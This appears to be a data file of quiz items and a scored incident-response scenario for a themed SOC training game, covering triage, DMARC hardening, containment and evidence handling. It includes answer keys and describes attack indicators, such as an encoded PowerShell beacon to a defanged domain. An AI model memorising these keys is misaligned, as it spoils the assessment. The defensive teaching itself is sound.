{ type: "multi", s: "A workstation shows several behaviors during triage.", e: "Observed:\nA) 300s-interval HTTPS to a domain registered last week\nB) Windows Update traffic to microsoft.com\nC) rundll32.exe executing from C:\\Users\\Public\\\nD) Backup agent uploading to the corporate backup server\nE) New Run-key persistence created by an unsigned binary", q: "Select ALL observations that are indicators of malicious activity:",
 options: [
  { t: "A -- periodic beaconing to a newly registered domain", c: true, w: "Fixed-interval traffic to a young domain is a C2 signature." },
  { t: "B -- Windows Update traffic", c: false, w: "Routine OS behavior to a known-good destination." },
  { t: "C -- rundll32 from a user-writable public path", c: true, w: "LOLBin executing from Users\\Public is classic staging." },
  { t: "D -- backup agent to the corporate backup server", c: false, w: "Expected data movement to sanctioned infrastructure." },
  { t: "E -- Run-key persistence from an unsigned binary", c: true, w: "Unsigned autoruns are a primary persistence indicator (T1547)." } ],
 x: "Three hostile behaviors (beacon, LOLBin staging, autorun persistence) interleaved with normal noise -- exactly how real triage looks." },
{ type: "multi", s: "You are hardening email authentication for the fleet's domain.", e: "Current DNS: SPF exists (~all soft-fail)\nNo DKIM signing | DMARC record: p=none", q: "Select ALL changes that materially reduce exact-domain spoofing reaching inboxes:",
 options: [
  { t: "Enable DKIM signing on all outbound mail streams", c: true, w: "Signatures let receivers verify integrity and DMARC alignment." },
  { t: "Move DMARC to p=quarantine, then p=reject after monitoring", c: true, w: "Enforcement is what actually stops delivery of spoofed mail -- staged rollout avoids breaking legitimate senders." },
  { t: "Tighten SPF to -all with an accurate sender inventory", c: true, w: "Hard fail plus a correct include list removes the soft-fail delivery loophole." },
  { t: "Add a banner to external email", c: false, w: "Useful awareness aid, but it does not stop exact-domain spoof delivery -- that's DMARC's job." },
  { t: "Rotate all user passwords", c: false, w: "Unrelated to sender authentication." } ],
 x: "Spoof prevention = SPF accuracy + DKIM signing + DMARC enforcement. Banners and passwords address different problems." },
{ type: "multi", s: "An ML anomaly-detection model is being added to the SOC pipeline.", e: "Design: continuous retraining on live traffic, auto-closes alerts it scores benign", q: "Select ALL legitimate risks of this design:",
 options: [
  { t: "Baseline poisoning -- persistent attacker behavior becomes 'normal'", c: true, w: "Slow-roll activity gets absorbed into the training data." },
  { t: "Silent suppression -- auto-closing hides model errors from humans", c: true, w: "Auto-close with no sampling review removes the human check on false negatives." },
  { t: "Model drift as the environment changes", c: true, w: "Traffic patterns evolve; unvalidated models decay quietly." },
  { t: "ML models cannot process network data", c: false, w: "They can; the risks are operational, not categorical." },
  { t: "Anomaly detection violates ATT&CK", c: false, w: "ATT&CK is a knowledge base, not a rulebook that tools can violate." } ],
 x: "V4 expects you to name AI-pipeline failure modes: poisoning, drift, and unreviewed automation -- and to keep humans sampling auto-closed work." },
{ type: "order", s: "A suspicious attachment needs safe analysis.", task: "Order the attachment-analysis workflow:",
 steps: ["Hash the file and check reputation sources", "Static review: strings, macros, embedded objects", "Detonate in an isolated sandbox with extended runtime", "Corroborate sandbox behavior against EDR telemetry from the recipient host", "Publish indicators and add detection content"],
 x: "Cheap checks first (hash/static), dynamic detonation third, then verify whether the real host showed the sandbox's behaviors, then operationalize the intel." },
{ type: "multi", s: "Post-AiTM-phish identity cleanup for three affected users.", e: "Confirmed: attacker proxied logins, captured passwords AND session tokens", q: "Select ALL required remediation actions:",
 options: [
  { t: "Revoke all active sessions and refresh tokens", c: true, w: "Token revocation is what actually evicts a session-theft attacker." },
  { t: "Reset the captured passwords", c: true, w: "The passwords are attacker-known; both credential and session must be invalidated." },
  { t: "Review mailbox rules and MFA method changes for persistence", c: true, w: "Attackers plant forwarding rules and register their own MFA methods to survive resets." },
  { t: "Only monitor the accounts for 30 days", c: false, w: "Monitoring an attacker who holds valid access is not remediation." },
  { t: "Delete the three user accounts", c: false, w: "Destructive overkill that punishes victims and loses evidence." } ],
 x: "Session-theft cleanup = revoke tokens + reset credentials + hunt persistence (rules, MFA methods, OAuth grants). Anything less leaves a door open." },
],
boss: {
 title: "Operation Static Storm: The Hornet Swarm Assault",
 brief: "Zurg's Hornet drones have opened a full-spectrum assault on Star Command Fleet Ops: a synthetic alert storm as cover, one real intrusion underneath. You have the SOC console, live meters, and five decisive moments. Find the signal, Ranger.",
 win: "The Swarm collapses into scrap. The real intrusion was found, scoped, contained, and documented -- Fleet Ops barely felt it. The Hornets retreat to Planet Z; this domain's mission is cleared.",
 lose: "The Swarm's noise did its job -- the real foothold survived your response. Review the choices that burned time and evidence, and deploy again.",
 stages: [
 { sit: "The assault begins: 5,000 alerts in fifteen minutes flood the console. Fleet Ops leadership is on comms demanding a status.",
  e: "4,880x 'inbound port scan' (matches known internet background + a benign researcher scanner)\n90x failed VPN logins: 85 accounts, 1 source IP\n6x 'Office spawned script interpreter': WINWORD.EXE -> wscript.exe, host WKS-LOG-041\n24x antivirus 'PUA' detections: browser toolbars",
  options: [
  { t: "Filter the scan noise, assign the spray to a teammate, and take the Office->wscript events yourself as priority one", d: 0, r: 3, ev: 0, ql: "best", w: "Severity-based triage under load: the macro chain is an active foothold, the spray is an attempt, the scans are weather. Delegation keeps both real threads moving." },
  { t: "Work the queue top-to-bottom so the record shows every alert reviewed", d: 20, r: -5, ev: 0, ql: "bad", w: "FIFO during a flood is exactly what the Swarm engineered -- you'll spend hours on scanner noise while the foothold digs in." },
  { t: "Bulk-close everything and wait for something new to fire", d: 15, r: -6, ev: -5, ql: "bad", w: "You just closed the six alerts that were the real intrusion." } ]},
 { sit: "WKS-LOG-041's process tree confirms it: a macro dropped a payload that's beaconing. Now you need scope -- fast -- while the host still runs.",
  e: "EDR: wscript.exe -> powershell.exe -enc ... -> beacon to relay-cdn[.]net every 240s\nproxy (30d) and NetFlow (90d) available fleet-wide",
  options: [
  { t: "Sweep proxy/NetFlow for relay-cdn[.]net across the fleet and capture WKS-LOG-041's memory before any containment", d: 0, r: 2, ev: 4, ql: "best", w: "Scope the indicator everywhere while preserving the volatile evidence that proves what the payload is -- both before tipping your hand." },
  { t: "Isolate WKS-LOG-041 immediately and investigate afterward", d: 6, r: 0, ev: -6, ql: "ok", w: "Defensible, but isolating before a fleet sweep may alert the operator to burn other footholds you haven't found yet -- and you skipped memory capture." },
  { t: "Reimage WKS-LOG-041 now; speed beats forensics", d: 12, r: -3, ev: -22, ql: "bad", w: "The implant, its memory-resident payload, and the entry evidence are gone -- and any other infected hosts remain." } ]},
 { sit: "The sweep finds two more beaconing hosts -- including a logistics server. Meanwhile the password spray just landed a success on a service account.",
  e: "Beaconing: WKS-LOG-041, WKS-LOG-013, SRV-LOGISTICS-2\nSpray success: svc-manifest (no MFA -- legacy exemption)\nSwarm chatter intercept: 'phase two at the top of the hour'",
  options: [
  { t: "Coordinated containment: isolate all three beaconing hosts simultaneously, disable svc-manifest's sessions, block the C2 domain at egress", d: 0, r: 3, ev: 1, ql: "best", w: "Simultaneous containment prevents the operator reacting host-by-host; the compromised service account is part of the same containment wave." },
  { t: "Isolate one host at a time, an hour apart, to watch attacker reactions", d: 18, r: -4, ev: 2, ql: "bad", w: "Staggered containment with a known 'phase two' deadline gifts the Swarm time to pivot and destroy evidence." },
  { t: "Disable svc-manifest only -- the servers are too important to isolate", d: 14, r: -2, ev: 0, ql: "ok", w: "Business pressure is real, but leaving active C2 on a logistics server through 'phase two' risks far worse downtime than isolation." } ]},
 { sit: "Containment holds. Forensics on the memory image reveals the payload was staging manifest archives for exfil that never completed. Legal asks for the evidentiary posture.",
  e: "Memory image: staged archive list, C2 config\nDisk: dropper + scheduled task\nAll captures hashed; access list: you + IR lead",
  options: [
  { t: "Preserve everything under chain of custody: hashed images, documented handlers, working copies for analysis, originals sealed", d: 0, r: 2, ev: 4, ql: "best", w: "Analysis happens on copies; originals stay pristine with custody records -- the posture that survives legal scrutiny." },
  { t: "Keep analyzing the original images directly to save time", d: 4, r: 0, ev: -12, ql: "ok", w: "Every direct touch of originals weakens admissibility; the copy step costs minutes and protects the case." },
  { t: "Delete the images after writing a summary -- storage is tight", d: 8, r: -4, ev: -25, ql: "bad", w: "Destroying primary evidence mid-incident is unrecoverable, legally and technically." } ]},
 { sit: "The Swarm retreats. Commander Nebula wants the debrief -- and Fleet Ops wants to never see this again.",
  e: "Findings: entry = macro email (no attachment detonation policy)\n| svc-manifest had a legacy MFA exemption\n| detection that caught it: Office->script-interpreter analytic",
  options: [
  { t: "After-action with root causes and fixes: attachment detonation policy, kill legacy MFA exemptions, promote the winning analytic fleet-wide, add C2-domain-age detection", d: 0, r: 4, ev: 0, ql: "best", w: "Lessons learned turns one incident into permanent capability: fix systemic gaps and scale what worked." },
  { t: "Report 'incident closed, no further action' to look decisive", d: 10, r: -5, ev: 0, ql: "bad", w: "Same gaps, next Swarm, same breach -- and leadership eventually learns what was omitted." },
  { t: "Recommend disciplining the user who opened the macro", d: 8, r: -6, ev: 0, ql: "bad", w: "Blame culture kills future reporting; the systemic controls (detonation, MFA policy) are the fix." } ]},
 ],
},
};
